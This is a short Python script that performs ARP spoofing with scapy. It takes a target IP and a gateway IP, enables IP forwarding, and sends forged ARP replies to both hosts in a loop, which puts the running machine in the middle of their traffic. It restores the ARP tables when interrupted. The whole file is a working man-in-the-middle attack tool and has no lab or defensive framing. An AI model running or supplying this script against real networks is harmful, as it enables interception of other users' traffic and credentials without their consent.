#! /usr/bin/env python

import os
import sys
import time
import scapy.all as scapy
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP ", required=True)
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP ", required=True)
    return parser.parse_args()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"No response from {ip}. Unable to get MAC address.")
        sys.exit()


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, count=4, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

args = get_arguments()
sent_packets_count = 0
target_ip = args.target
gateway_ip = args.gateway


try:
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print(f"\r[+] Sent packets: {sent_packets_count}", end="")
        time.sleep(0.1)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...")
finally:
    print("Resetting ARP tables... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] ARP tables reset successfully.")